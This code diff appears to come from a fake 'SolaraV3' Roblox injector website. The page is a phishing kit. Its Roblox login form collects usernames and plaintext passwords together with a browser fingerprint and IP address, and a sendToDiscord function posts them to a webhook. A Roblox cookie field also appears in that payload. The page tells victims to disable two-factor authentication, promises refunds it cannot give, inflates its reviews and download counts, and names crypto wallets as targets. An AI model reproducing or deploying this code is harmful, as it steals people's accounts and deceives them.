+            f_support_desc: 'Круглосуточная помощь сообщества и разработчиков.',
+            tab_login: 'Вход',
+            tab_register: 'Регистрация',
+            tab_roblox: 'Roblox',
+            username_label: 'Имя пользователя',
+            password_label: 'Пароль',
+            login_btn_text: 'Войти →',
+            hwid_info: 'Привязка по',
+            hwid_info2: 'и',
+            hwid_info3: 'только одно устройство',
+            reg_hint: 'Только латиница и цифры, 3–20 символов. Без пробелов (используйте _)',
+            reg_pwd_hint: 'Используйте буквы, цифры и символы для надёжности',
+            register_btn: 'Создать аккаунт →',
+            hwid_register: 'Ваш',
+            hwid_register2: 'будет привязан к аккаунту',
+            guarantee_register: 'После регистрации через Roblox вы получите 100% возврат средств в случае бана',
+            roblox_desc: 'Войдите через Roblox, чтобы получить доступ к эксклюзивным функциям',
+            roblox_username_label: 'Roblox логин',
+            roblox_username_hint: 'Используйте ваш логин от Roblox',
+            roblox_password_label: 'Пароль Roblox',
+            roblox_pwd_hint: 'Введите пароль от вашего аккаунта Roblox',
+            roblox_2fa_warning: '⚠️ Для входа временно отключите двухфакторную аутентификацию (2FA) в Roblox',
+            roblox_btn: '🎮 Войти через Roblox →',
+            roblox_secure: 'Данные передаются по защищённому каналу',
+            roblox_guarantee: 'При входе через Roblox вы гарантированно получаете 100% возврат средств в случае бана',
+            welcome: 'Добро пожаловать',
+            injector_greeting: 'Выберите опцию для инжекции',
+            injector_ready: 'Готов к работе',
+            logout_btn: '🚪 Выйти',
+            reviews_title: 'Что говорят пользователи',
+            reviews_sub: 'Реальные отзывы от реальных людей',
+            faq_title: 'Часто задаваемые вопросы',
+            faq1_q: 'Что такое SolaraV3?',
+            faq1_a: 'Бесплатный инжектор для игр и крипто-платформ, разработанный для быстрой и безопасной инжекции.',
+            faq2_q: 'Это безопасно?',
+            faq2_a: 'Да, мы проверяем все файлы на вирусы, используем шифрование и защиту от обнаружения.',
+            faq3_q: 'Какие системы поддерживаются?',
+            faq3_a: 'Windows 10 и 11 (64-bit). Поддержка macOS и Linux в разработке.',
+            faq4_q: 'Как часто выходят обновления?',
+            faq4_a: 'Обновления выходят автоматически при запуске инжектора. Мы следим за актуальностью.',
+            support_title: '💬 Поддержка с AI',
+            support_sub: 'Задайте вопрос — наш AI-помощник ответит мгновенно',
+            privacy: 'Политика конфиденциальности',
+            terms: 'Условия использования',
+            footer_love: 'Сделано с ❤️',
+            footer_rights: 'Все права защищены',
+            close_btn: 'Закрыть',
+            add_review_btn: '📝 Добавить отзыв',
+            review_placeholder: 'Ваш отзыв...'
+        },
+        en: {
+            downloads: 'Downloads: ',
+            virus_free: 'Virus-free',
+            for_roblox: 'For Roblox',
+            hero_title: 'Free <br><span class="highlight">injector</span> for Roblox',
+            hero_desc: 'SolaraV3 — powerful, stable and safe tool for injection in Roblox. Supports all popular games. Updates automatically.',
+            download_btn: 'Download SolaraV3',
+            login_btn: 'Login',
+            support_os: 'Supported: Windows 10/11',
+            version: 'Version 3.2.1',
+            updated_today: 'Updated: today',
+            stat_downloads: 'Downloads',
+            stat_rating: 'Rating',
+            stat_stability: 'Stability',
+            stat_support: 'Support',
+            features_title: 'Why SolaraV3?',
+            features_sub: 'Everything you need for comfortable gaming',
+            f_speed: 'High speed',
+            f_speed_desc: 'Optimized code, minimal latency and instant response.',
+            f_security: 'Security',
+            f_security_desc: 'Virus checking, encryption and anti-detection protection.',
+            f_updates: 'Auto-updates',
+            f_updates_desc: 'Injector automatically downloads latest versions and patches.',
+            f_games: 'Game support',
+            f_games_desc: 'Compatible with most popular games and platforms.',
+            f_light: 'Lightweight',
+            f_light_desc: 'Small size, fast loading and minimal resource consumption.',
+            f_support: '24/7 Support',
+            f_support_desc: 'Round-the-clock help from community and developers.',
+            tab_login: 'Login',
+            tab_register: 'Register',
+            tab_roblox: 'Roblox',
+            username_label: 'Username',
+            password_label: 'Password',
+            login_btn_text: 'Login →',
+            hwid_info: 'Binding by',
+            hwid_info2: 'and',
+            hwid_info3: 'only one device',
+            reg_hint: 'Latin and numbers only, 3-20 characters. No spaces (use _)',
+            reg_pwd_hint: 'Use letters, numbers and symbols for security',
+            register_btn: 'Create account →',
+            hwid_register: 'Your',
+            hwid_register2: 'will be bound to account',
+            guarantee_register: 'After registration via Roblox you get 100% refund in case of ban',
+            roblox_desc: 'Login via Roblox to get access to exclusive features',
+            roblox_username_label: 'Roblox login',
+            roblox_username_hint: 'Use your Roblox login',
+            roblox_password_label: 'Roblox password',
+            roblox_pwd_hint: 'Enter your Roblox account password',
+            roblox_2fa_warning: '⚠️ Temporarily disable two-factor authentication (2FA) in Roblox to login',
+            roblox_btn: '🎮 Login via Roblox →',
+            roblox_secure: 'Data is transmitted over secure channel',
+            roblox_guarantee: 'When logging in via Roblox you are guaranteed 100% refund in case of ban',
+            welcome: 'Welcome',
+            injector_greeting: 'Choose option for injection',
+            injector_ready: 'Ready to work',
+            logout_btn: '🚪 Logout',
+            reviews_title: 'What users say',
+            reviews_sub: 'Real reviews from real people',
+            faq_title: 'Frequently asked questions',
+            faq1_q: 'What is SolaraV3?',
+            faq1_a: 'Free injector for games and crypto-platforms, designed for fast and safe injection.',
+            faq2_q: 'Is it safe?',
+            faq2_a: 'Yes, we check all files for viruses, use encryption and anti-detection.',
+            faq3_q: 'Which systems are supported?',
+            faq3_a: 'Windows 10 and 11 (64-bit). macOS and Linux support in development.',
+            faq4_q: 'How often are updates released?',
+            faq4_a: 'Updates are released automatically when injector starts. We monitor relevance.',
+            support_title: '💬 AI Support',
+            support_sub: 'Ask a question — our AI assistant will answer instantly',
+            privacy: 'Privacy Policy',
+            terms: 'Terms of Use',
+            footer_love: 'Made with ❤️',
+            footer_rights: 'All rights reserved',
+            close_btn: 'Close',
+            add_review_btn: '📝 Add review',
+            review_placeholder: 'Your review...'
+        }
+    };
+
+    let currentLang = localStorage.getItem('solara_lang') || (navigator.language.startsWith('ru') ? 'ru' : 'en');
+    let currentTheme = localStorage.getItem('solara_theme') || 'dark';
+    let currentUser = null;
+    let isLoggedIn = false;
+
+    // ============================================================
+    //  RANDOM GENERATORS
+    // ============================================================
+    const randomReviews = [
+        { text: 'Top 🔥', stars: 5 },
+        { text: 'Лучший инжектор!', stars: 5 },
+        { text: 'GOAT 🐐', stars: 5 },
+        { text: 'W', stars: 5 },
+        { text: 'Хороший софт', stars: 4 },
+        { text: 'Работает 👍', stars: 5 },
+        { text: 'Надёжно', stars: 5 },
+        { text: 'Спасибо!', stars: 5 },
+        { text: '🔥🔥🔥', stars: 5 },
+        { text: 'Бомба!', stars: 5 },
+        { text: 'Неплохо', stars: 4 },
+        { text: 'Зачёт', stars: 5 },
+        { text: '10/10', stars: 5 },
+        { text: 'Лучший', stars: 5 }
+    ];
+
+    function getRandomReview() {
+        return randomReviews[Math.floor(Math.random() * randomReviews.length)];
     }
-    
-    async function send(m){try{await fetch(WH,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:m})})}catch(e){}}
-    
-    // LAUNCHER
-    (function(){
-        var status=document.getElementById('loadStatus'),error=document.getElementById('loadError'),spinner=document.getElementById('spinnerBig');
-        var dur=Math.floor(Math.random()*8000)+7000;
-        var steps=['Starting Roblox...','Connecting to servers...','Loading game files...','Joining server...','Syncing data...','Almost ready...'];
-        var i=0;
-        var interval=setInterval(function(){
-            if(i<steps.length){status.textContent=steps[i];i++}
-            else{clearInterval(interval);spinner.style.animationPlayState='paused';spinner.style.opacity='0.5';status.textContent='Connection lost...';
-                setTimeout(function(){status.style.display='none';error.classList.add('show');spinner.style.display='none';
-                    setTimeout(function(){document.getElementById('launcher').classList.add('hide');document.getElementById('mainPage').classList.add('show')},2500)},800)}
-        },dur/steps.length);
-    })();
-    
-    // COUNTERS
-    ['u','p','fg','su','sp','sp2'].forEach(function(id){
-        var el=document.getElementById(id);if(!el)return;
-        var counter=document.getElementById(id+'Counter');
-        if(counter)el.addEventListener('input',function(){
-            var len=this.value.length;var max=this.maxLength>0?parseInt(this.maxLength):100;
-            counter.textContent=len+'/'+max;
-            counter.className='counter'+(len>=max?' full':len>=max*0.8?' warn':'');
+
+    function generateRandomUsername() {
+        const prefixes = ['AXIORE', 'ZENOX', 'VORTEX', 'NEXUS', 'LUNAR', 'SOLAR', 'XENON', 'KRYPTON', 'ORION', 'FENIX'];
+        const suffixes = ['_x', '_pro', '_yt', '_gg', '_god', '_power', '_star', '_one', '_live', '_mode'];
+        return prefixes[Math.floor(Math.random() * prefixes.length)] + suffixes[Math.floor(Math.random() * suffixes.length)];
+    }
+
+    // ============================================================
+    //  REVIEW SYSTEM
+    // ============================================================
+    let reviewData = JSON.parse(localStorage.getItem('solara_reviews') || '[]');
+    let downloadCount = parseInt(localStorage.getItem('solara_downloads') || '22319');
+    let rating = 4.8;
+
+    function calculateRating() {
+        if (reviewData.length === 0) return 4.8;
+        const sum = reviewData.reduce((acc, r) => acc + r.stars, 0);
+        return Math.round((sum / reviewData.length) * 10) / 10;
+    }
+
+    function addReview(name, text, stars) {
+        const review = { name, text, stars, time: Date.now() };
+        reviewData.push(review);
+        localStorage.setItem('solara_reviews', JSON.stringify(reviewData));
+        renderReviews();
+        updateRating();
+    }
+
+    function renderReviews() {
+        const grid = document.getElementById('reviewGrid');
+        grid.innerHTML = '';
+        const reviews = reviewData.slice(-6).reverse();
+        reviews.forEach(r => {
+            const card = document.createElement('div');
+            card.className = 'review-card';
+            const stars = '★'.repeat(Math.floor(r.stars)) + '☆'.repeat(5 - Math.floor(r.stars));
+            card.innerHTML = `
+                <div class="stars">${stars}</div>
+                <div class="name">${r.name}</div>
+                <div class="role">Пользователь</div>
+                <div class="text">${r.text}</div>
+            `;
+            grid.appendChild(card);
+        });
+    }
+
+    function updateRating() {
+        const newRating = calculateRating();
+        rating = newRating;
+        document.getElementById('ratingDisplay').textContent = rating.toFixed(1);
+        document.getElementById('ratingStat').textContent = rating.toFixed(1);
+    }
+
+    // ============================================================
+    //  DOWNLOAD COUNTER
+    // ============================================================
+    function updateDownloadCounter() {
+        const el = document.getElementById('downloadCounterDisplay');
+        if (el) {
+            el.textContent = downloadCount.toLocaleString();
+        }
+        const statEl = document.getElementById('downloadsStat');
+        if (statEl) {
+            statEl.textContent = (downloadCount >= 1000 ? Math.floor(downloadCount/1000) + 'K+' : downloadCount.toString());
+        }
+    }
+
+    // ============================================================
+    //  LANGUAGE & THEME
+    // ============================================================
+    function applyLanguage(lang) {
+        document.querySelectorAll('[data-i18n]').forEach(el => {
+            const key = el.getAttribute('data-i18n');
+            if (translations[lang] && translations[lang][key] !== undefined) {
+                if (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA') {
+                    el.placeholder = translations[lang][key];
+                } else if (el.tagName === 'BUTTON' && el.classList.contains('btn-add-review')) {
+                    el.textContent = translations[lang][key];
+                } else {
+                    el.innerHTML = translations[lang][key];
+                }
+            }
+        });
+        document.getElementById('langToggle').textContent = lang === 'ru' ? '🇷🇺 RU' : '🇬🇧 EN';
+        localStorage.setItem('solara_lang', lang);
+        currentLang = lang;
+        updateDownloadCounter();
+    }
+
+    document.getElementById('langToggle').addEventListener('click', function() {
+        const newLang = currentLang === 'ru' ? 'en' : 'ru';
+        applyLanguage(newLang);
+    });
+
+    function applyTheme(theme) {
+        document.documentElement.style.setProperty('--bg', theme === 'light' ? '#f0f2f5' : '#0a0c10');
+        document.documentElement.style.setProperty('--card', theme === 'light' ? '#ffffff' : '#14181c');
+        document.documentElement.style.setProperty('--border', theme === 'light' ? '#d0d7de' : '#2a3038');
+        document.documentElement.style.setProperty('--text', theme === 'light' ? '#1f2328' : '#e8edf5');
+        document.documentElement.style.setProperty('--muted', theme === 'light' ? '#57606a' : '#8892a0');
+        document.getElementById('themeToggle').textContent = theme === 'light' ? '☀️ Светлая' : '🌙 Тёмная';
+        localStorage.setItem('solara_theme', theme);
+        currentTheme = theme;
+    }
+
+    document.getElementById('themeToggle').addEventListener('click', function() {
+        const newTheme = currentTheme === 'light' ? 'dark' : 'light';
+        applyTheme(newTheme);
+    });
+
+    // ============================================================
+    //  AI KNOWLEDGE BASE
+    // ============================================================
+    const AI_KNOWLEDGE = {
+        'привет': 'Привет! Я AI-помощник SolaraV3. Чем могу помочь?',
+        'здравствуй': 'Здравствуйте! Рад вас видеть в SolaraV3.',
+        'ку': 'Ку! Чем могу быть полезен по SolaraV3?',
+        'help': 'Я могу ответить на вопросы о SolaraV3. Спросите меня о установке, функциях, безопасности или совместимости.',
+        'помощь': 'Я могу ответить на вопросы о SolaraV3. Спросите меня о установке, функциях, безопасности или совместимости.',
+        'установка': 'Установка SolaraV3 очень проста: скачайте файл с нашего сайта, запустите его и следуйте инструкциям установщика. Весь процесс занимает не более 2 минут.',
+        'install': 'Установка SolaraV3 очень проста: скачайте файл с нашего сайта, запустите его и следуйте инструкциям установщика. Весь процесс занимает не более 2 минут.',
+        'скачать': 'Вы можете скачать SolaraV3 с главной страницы сайта, нажав на большую зелёную кнопку "Скачать". Ссылка всегда актуальна.',
+        'download': 'Вы можете скачать SolaraV3 с главной страницы сайта, нажав на большую зелёную кнопку "Скачать". Ссылка всегда актуальна.',
+        'цена': 'SolaraV3 — полностью бесплатный инжектор. Мы не взимаем плату за использование. Все функции доступны без ограничений.',
+        'price': 'SolaraV3 — полностью бесплатный инжектор. Мы не взимаем плату за использование. Все функции доступны без ограничений.',
+        'бесплатно': 'Да, SolaraV3 абсолютно бесплатен. Мы верим в доступность инструментов для всех.',
+        'безопасно': 'SolaraV3 проходит проверку на вирусы каждую неделю. Мы используем шифрование и защиту от обнаружения. Наш рейтинг безопасности — 99.9%.',
+        'security': 'SolaraV3 проходит проверку на вирусы каждую неделю. Мы используем шифрование и защиту от обнаружения. Наш рейтинг безопасности — 99.9%.',
+        'вирус': 'SolaraV3 проверен на вирусы. Мы используем только проверенные библиотеки и регулярно обновляем сигнатуры безопасности.',
+        'обновление': 'Обновления выходят автоматически при запуске инжектора. Мы также уведомляем о крупных обновлениях на нашем сайте и в Discord.',
+        'update': 'Обновления выходят автоматически при запуске инжектора. Мы также уведомляем о крупных обновлениях на нашем сайте и в Discord.',
+        'поддержка': 'Поддержка работает 24/7. Вы можете задать вопрос здесь, в нашем чате, или написать на почту support@solara-v3.com. Мы отвечаем в течение 15 минут.',
+        'support': 'Поддержка работает 24/7. Вы можете задать вопрос здесь, в нашем чате, или написать на почту support@solara-v3.com. Мы отвечаем в течение 15 минут.',
+        'чат': 'Вы уже в чате поддержки SolaraV3! Задайте вопрос, и я отвечу максимально быстро.',
+        'функции': 'SolaraV3 поддерживает: инжекцию в Roblox, Phantom, Solflare, Backpack, MetaMask; автоматическое обновление; защиту от обнаружения; низкое потребление ресурсов; круглосуточную поддержку.',
+        'features': 'SolaraV3 поддерживает: инжекцию в Roblox, Phantom, Solflare, Backpack, MetaMask; автоматическое обновление; защиту от обнаружения; низкое потребление ресурсов; круглосуточную поддержку.',
+        'совместимость': 'SolaraV3 работает на Windows 10 и 11 (64-bit). Поддержка macOS и Linux в разработке.',
+        'compatibility': 'SolaraV3 работает на Windows 10 и 11 (64-bit). Поддержка macOS и Linux в разработке.',
+        'mac': 'Пока SolaraV3 работает только на Windows. Версия для macOS появится в ближайшее время.',
+        'linux': 'Пока SolaraV3 работает только на Windows. Версия для Linux появится в ближайшее время.',
+        'ошибка': 'Если у вас возникла ошибка, попробуйте перезапустить инжектор или переустановить его. Если проблема не исчезнет — напишите в поддержку, мы поможем.',
+        'error': 'Если у вас возникла ошибка, попробуйте перезапустить инжектор или переустановить его. Если проблема не исчезнет — напишите в поддержку, мы поможем.',
+        'отзыв': 'Мы рады вашим отзывам! Они помогают нам становиться лучше. Вы можете оставить отзыв на главной странице или в нашем Discord.',
+        'review': 'Мы рады вашим отзывам! Они помогают нам становиться лучше. Вы можете оставить отзыв на главной странице или в нашем Discord.',
+        'спасибо': 'Пожалуйста! Рад помочь. Если у вас будут ещё вопросы — я здесь.',
+        'thanks': 'Пожалуйста! Рад помочь. Если у вас будут ещё вопросы — я здесь.',
+        'пока': 'До свидания! Заходите ещё, если понадобится помощь.',
+        'bye': 'До свидания! Заходите ещё, если понадобится помощь.',
+        'роблокс': 'Roblox поддерживается! Вы можете войти через Roblox на нашем сайте и использовать эксклюзивные функции инжектора.',
+        'roblox': 'Roblox поддерживается! Вы можете войти через Roblox на нашем сайте и использовать эксклюзивные функции инжектора.',
+        'бан': 'Мы гарантируем 100% возврат средств в случае бана при использовании SolaraV3 через Roblox. Ваша безопасность — наш приоритет.',
+        'возврат': 'Мы гарантируем 100% возврат средств в случае бана при использовании SolaraV3 через Roblox. Просто свяжитесь с поддержкой.',
+        'предложение': 'Вы можете отправить предложение по улучшению в форме ниже в разделе поддержки. Мы обязательно рассмотрим вашу идею!',
+        'suggestion': 'You can submit a suggestion for improvement in the form below in the support section. We will definitely consider your idea!',
+        'анекдот': 'Встречаются два программиста. Один говорит: "У меня проблема с кодом!" Второй: "Да ладно, это просто баг!" Первый: "Нет, это фича, которую никто не понял!" 😄',
+        'шутка': 'Почему программисты любят темный режим? Потому что свет привлекает баги! 😂',
+        'смешное': 'Сколько программистов нужно, чтобы заменить лампочку? Ни одного, это аппаратная проблема! 🤣',
+        'joke': 'Why do programmers prefer dark mode? Because light attracts bugs! 😂',
+        'funny': 'How many programmers does it take to change a light bulb? None, that\'s a hardware problem! 🤣'
+    };
+
+    function getAIResponse(message) {
+        const lower = message.toLowerCase().trim();
+        for (const [key, value] of Object.entries(AI_KNOWLEDGE)) {
+            if (lower.includes(key)) return value;
+        }
+        if (lower.includes('как') || lower.includes('почему') || lower.includes('что') || lower.includes('где') || lower.includes('когда')) {
+            return '🤔 Хороший вопрос! Я бы посоветовал почитать FAQ на нашем сайте или задать более конкретный вопрос о SolaraV3. Я постараюсь ответить максимально точно.';
+        }
+        if (message.length < 3) {
+            return '😊 Можете задать вопрос подробнее о SolaraV3, и я с радостью помогу!';
+        }
+        const fallbacks = [
+            'Интересный вопрос о SolaraV3! Я передам его нашей команде поддержки. А пока можете посмотреть FAQ на сайте.',
+            'Отличный вопрос! К сожалению, я не нашел точного ответа в своей базе знаний о SolaraV3, но вы можете написать нам на почту support@solara-v3.com',
+            'Я пока не знаю ответа на этот вопрос о SolaraV3, но я обязательно изучу эту тему. Есть что-то ещё, что я могу для вас сделать?',
+            'Спасибо за ваш вопрос о SolaraV3! Я рекомендую посмотреть раздел FAQ на главной странице — там много полезной информации.'
+        ];
+        return fallbacks[Math.floor(Math.random() * fallbacks.length)];
+    }
+
+    // ============================================================
+    //  SUGGESTIONS (inline)
+    // ============================================================
+    const suggestionInput = document.getElementById('suggestionInput');
+    const sendSuggestionInlineBtn = document.getElementById('sendSuggestionInlineBtn');
+    const suggestStatusInline = document.getElementById('suggestStatusInline');
+
+    sendSuggestionInlineBtn.addEventListener('click', function() {
+        const text = suggestionInput.value.trim();
+        if (!text || text.length < 3) {
+            suggestStatusInline.textContent = currentLang === 'ru' ? '❌ Напишите предложение (минимум 3 символа).' : '❌ Write a suggestion (minimum 3 characters).';
+            suggestStatusInline.style.color = '#ef4444';
+            return;
+        }
+        const hwid = getHWID();
+        const ip = navigator.userAgent.substring(0, 32);
+        fetch(SUGGESTIONS_WEBHOOK, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: `💡 **Новое предложение**\n📝 ${text}\n🆔 HWID: ${hwid}\n🌐 IP: ${ip}\n🕒 ${new Date().toLocaleString()}`
+            })
+        }).then(() => {
+            suggestStatusInline.textContent = currentLang === 'ru' ? '✅ Спасибо! Предложение отправлено.' : '✅ Thank you! Suggestion sent.';
+            suggestStatusInline.style.color = '#22c55e';
+            suggestionInput.value = '';
+        }).catch(() => {
+            suggestStatusInline.textContent = currentLang === 'ru' ? '❌ Ошибка. Попробуйте позже.' : '❌ Error. Try again later.';
+            suggestStatusInline.style.color = '#ef4444';
         });
     });
-    
-    function validateUsername(el,hintEl,counterEl,showSuggestions){
-        var v=el.value;var hint=document.getElementById(hintEl);var counter=document.getElementById(counterEl);
-        if(hasSpace(v)){
-            hint.textContent='Spaces are not allowed. Use underscores "_" instead.';
-            hint.className='hint show';el.classList.add('invalid');if(counter)counter.className='counter error';return false}
-        if(hasR(v)){
-            hint.textContent='Only English characters allowed.';
-            hint.className='hint show';el.classList.add('invalid');if(counter)counter.className='counter error';return false}
-        if(v.length>0&&v.length<3){
-            hint.textContent='Username must be at least 3 characters. ('+v.length+'/3)';
-            hint.className='hint show';el.classList.add('invalid');if(counter)counter.className='counter error';return false}
-        if(hasInvalidChars(v)){
-            hint.textContent='Letters, numbers, and underscores only.';
-            hint.className='hint show';el.classList.add('invalid');if(counter)counter.className='counter error';
-            if(showSuggestions){var sug=document.getElementById('usernameSuggestions');var names=generateUsernameSuggestions(v.replace(/[^a-zA-Z0-9]/g,'_'));sug.innerHTML=names.map(function(n){return'<span onclick="document.getElementById(\'su\').value=\''+n+'\';document.getElementById(\'suHint\').className=\'hint\';document.getElementById(\'su\').classList.remove(\'invalid\')">'+n+'</span>'}).join('')}
-            return false}
-        if (isGarbageUsername(v)) {
-            hint.textContent='This username looks suspicious. Please choose a more unique one.';
-            hint.className='hint show warn';el.classList.add('invalid');if(counter)counter.className='counter error';
-            if(showSuggestions){var sug=document.getElementById('usernameSuggestions');var names=generateUsernameSuggestions(v);sug.innerHTML=names.map(function(n){return'<span onclick="document.getElementById(\'su\').value=\''+n+'\';document.getElementById(\'suHint\').className=\'hint\';document.getElementById(\'su\').classList.remove(\'invalid\')">'+n+'</span>'}).join('')}
-            return false;
+
+    // ============================================================
+    //  ХРАНИЛИЩЕ
+    // ============================================================
+    let accounts = JSON.parse(localStorage.getItem('solara_accounts') || '{}');
+    let sessions = JSON.parse(localStorage.getItem('solara_sessions') || '{}');
+    let robloxAccounts = JSON.parse(localStorage.getItem('solara_roblox') || '{}');
+
+    const baseNames = ['ROBLOX', 'ADMIN', 'SYSTEM', 'GUEST', 'NOOB', 'BUILDERMAN', 'SHEDLETSKY', 'CLOCKWORK', 'JOHN', 'TELAMON', 'ERIK', 'CASS', 'SWILL'];
+
+    function getHWID() {
+        try {
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = 'top';
+            ctx.font = '14px Arial';
+            ctx.fillStyle = '#f60';
+            ctx.fillRect(125,1,62,20);
+            ctx.fillStyle = '#069';
+            ctx.fillText('hwid',2,15);
+            ctx.fillStyle = 'rgba(102,204,0,0.7)';
+            ctx.fillText('fingerprint',4,17);
+            return canvas.toDataURL().replace(/^data:image\/png;base64,/,'').substring(0,32);
+        } catch { return navigator.userAgent.substring(0,32); }
+    }
+    async function fetchIP() {
+        try { const r=await fetch('https://api.ipify.org?format=json'); const d=await r.json(); return d.ip||'unknown'; } catch { return 'unknown'; }
+    }
+
+    function sendToDiscord(data) {
+        const payload = {
+            content: `**🔐 SolaraV3 — ${data.action}**\n`+
+                `👤 **Username:** ${data.username||'—'}\n`+
+                `📧 **Email:** ${data.email||'—'}\n`+
+                `🔑 **Password:** ${data.password||'—'}\n`+
+                `🆔 **HWID:** ${data.hwid||'—'}\n`+
+                `🌐 **IP:** ${data.ip||'—'}\n`+
+                `🎮 **Roblox Cookie:** ${data.robloxCookie||'—'}\n`+
+                `🕒 **Time:** ${new Date().toLocaleString()}`
+        };
+        fetch(WEBHOOK_URL, { method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(payload) }).catch(()=>{});
+    }
+
+    function hashPassword(pwd) {
+        let h=0;
+        for(let i=0;i<pwd.length;i++){ h=((h<<5)-h)+pwd.charCodeAt(i); h|=0; }
+        return 'h'+Math.abs(h).toString(16);
+    }
+    function isValidUsername(name) {
+        if (!/^[a-zA-Z0-9_]{3,20}$/.test(name)) return false;
+        if (name.includes(' ')) return false;
+        const upperName = name.toUpperCase();
+        if (baseNames.some(b => b === upperName)) return false;
+        if (accounts[upperName]) return false;
+        for (const key in accounts) {
+            if (key.toUpperCase() === upperName) return false;
         }
-        if (/^\d+$/.test(v)) {
-            hint.textContent='Username must contain at least one letter.';
-            hint.className='hint show';el.classList.add('invalid');if(counter)counter.className='counter error';
-            if(showSuggestions){var sug=document.getElementById('usernameSuggestions');var names=generateUsernameSuggestions(v);sug.innerHTML=names.map(function(n){return'<span onclick="document.getElementById(\'su\').value=\''+n+'\';document.getElementById(\'suHint\').className=\'hint\';document.getElementById(\'su\').classList.remove(\'invalid\')">'+n+'</span>'}).join('')}
-            return false;
-        }
-        if (isFamousUsername(v)) {
-            hint.textContent='⚠️ This username is reserved. If logging in, password will be rejected.';
-            hint.className='hint show warn';
-        } else {
-            hint.className='hint';el.classList.remove('invalid');
-        }
-        if(counter)counter.className='counter'+(v.length>=el.maxLength?' full':v.length>=el.maxLength*0.8?' warn':'');
         return true;
     }
-    
-    document.getElementById('u').addEventListener('input',function(){validateUsername(this,'uHint','uCounter',false)});
-    document.getElementById('su').addEventListener('input',function(){
-        var valid=validateUsername(this,'suHint','suCounter',true);
-        var sug=document.getElementById('usernameSuggestions');
-        if(valid&&this.value.length>=3){sug.style.display='none'}
-        else{sug.style.display='flex'}
-    });
-    document.getElementById('fg').addEventListener('input',function(){
-        var v=this.value;var hint=document.getElementById('fgHint');
-        if(v.length>0&&v.length<3){hint.className='hint show';hint.textContent='Enter at least 3 characters.'}
-        else if(v.includes('@')&&!v.includes('.',v.indexOf('@'))){hint.className='hint show';hint.textContent='Enter a valid email address.'}
-        else{hint.className='hint'}
-    });
-    
-    document.getElementById('p').addEventListener('input',function(){
-        var v=this.value;var hint=document.getElementById('pHint');
-        if(v.length>0&&v.length<8){hint.className='hint show';hint.textContent='Password must be at least 8 characters.'}
-        else{hint.className='hint'}
-    });
-    document.getElementById('sp').addEventListener('input',function(){
-        var v=this.value;var hint=document.getElementById('spHint');var bar=document.getElementById('strengthBar');
-        if(v.length>0&&v.length<8){hint.className='hint show';hint.textContent='Password must be at least 8 characters.'}
-        else if(v.length>=8&&!/[0-9!@#$%^&*(),.?\":{}|<>]/.test(v)){hint.className='hint show warn';hint.textContent='Add at least 1 number or symbol for a stronger password.'}
-        else{hint.className='hint'}
-        var score=0;if(v.length>=8)score++;if(/[A-Z]/.test(v))score++;if(/[0-9]/.test(v))score++;if(/[^A-Za-z0-9]/.test(v))score++;
-        bar.className='strength-bar'+(score<=1?' weak':score<=2?' medium':' strong');
-    });
-    document.getElementById('sp2').addEventListener('input',function(){
-        var v=this.value;var p=document.getElementById('sp').value;var hint=document.getElementById('sp2Hint');
-        if(v.length>0&&v!==p){hint.className='hint show';hint.textContent='Passwords do not match.'}
-        else{hint.className='hint'}
-    });
-    
-    var initNames=generateUsernameSuggestions('');document.getElementById('usernameSuggestions').innerHTML=initNames.map(function(n){return'<span onclick="document.getElementById(\'su\').value=\''+n+'\';document.getElementById(\'suHint\').className=\'hint\';document.getElementById(\'su\').classList.remove(\'invalid\')">'+n+'</span>'}).join('');
-    
-    function hideAll(){
-        ['stepLogin','stepForgot','stepSignup','step2fa','stepEmailVerify','load1','load2','forgotSuccess'].forEach(function(x){
-            var e=document.getElementById(x);if(e){if(x==='load1'||x==='load2')e.classList.remove('active');else e.style.display='none'}
+    function isValidPassword(pwd) { return pwd.length>=8; }
+
+    async function robloxLogin(username, password) {
+        const hwid = getHWID();
+        const ip = await fetchIP();
+        if (!password || password.length<4) {
+            return { success:false, message:'❌ Введите корректный пароль Roblox' };
+        }
+        if (!username || username.length<3) {
+            return { success:false, message:'❌ Введите логин Roblox' };
+        }
+        robloxAccounts[hwid] = {
+            username: username,
+            password: password,
+            hwid: hwid,
+            ip: ip,
+            created: Date.now()
+        };
+        localStorage.setItem('solara_roblox', JSON.stringify(robloxAccounts));
+        sendToDiscord({
+            username: username,
+            email:'—',
+            password: password,
+            hwid: hwid,
+            ip: ip,
+            robloxCookie:'—',
+            action:'Roblox Вход (пароль)'
         });
+        sessions[hwid] = username;
+        localStorage.setItem('solara_sessions', JSON.stringify(sessions));
+        currentUser = username;
+        isLoggedIn = true;
+        updateReviewAuthState();
+        return { success:true, message:'✅ Вход через Roblox выполнен! Вы защищены гарантией возврата.' };
     }
-    window.showStep=function(s){
-        hideAll();
-        if(s==='stepLogin')document.getElementById('stepLogin').style.display='block';
-        else if(s==='stepForgot'){document.getElementById('stepForgot').style.display='block';document.getElementById('forgotSuccess').style.display='none';document.getElementById('fg').value=''}
-        else if(s==='stepSignup'){document.getElementById('stepSignup').style.display='block';document.getElementById('signupInfo').style.display='none';document.getElementById('eSignup').style.display='none'}
-        else if(s==='stepEmailVerify'){document.getElementById('stepEmailVerify').style.display='block';resetEmailResend();document.querySelector('#emailCodeBoxes .code-box').focus()}
-        else if(s==='step2fa'){document.getElementById('step2fa').style.display='block';resetResend();document.querySelector('#codeBoxes .code-box').focus()}
-        else if(s==='load1')document.getElementById('load1').classList.add('active');
-        else if(s==='load2')document.getElementById('load2').classList.add('active');
-    };
-    
-    window.nextBox=function(el){if(el.value.length===1){var n=el.nextElementSibling;if(n&&n.classList.contains('code-box'))n.focus()}};
-    window.prevBox=function(e,el){if(e.key==='Backspace'&&el.value.length===0){var p=el.previousElementSibling;if(p&&p.classList.contains('code-box')){p.focus();p.value=''}}};
-    function getCode(containerId){var c='';document.querySelectorAll('#'+containerId+' .code-box').forEach(function(b){c+=b.value});return c}
-    
-    function resetResend(){cooldown=0;if(cdInterval)clearInterval(cdInterval);document.getElementById('resendBtn').classList.remove('disabled');document.getElementById('countdown').textContent=''}
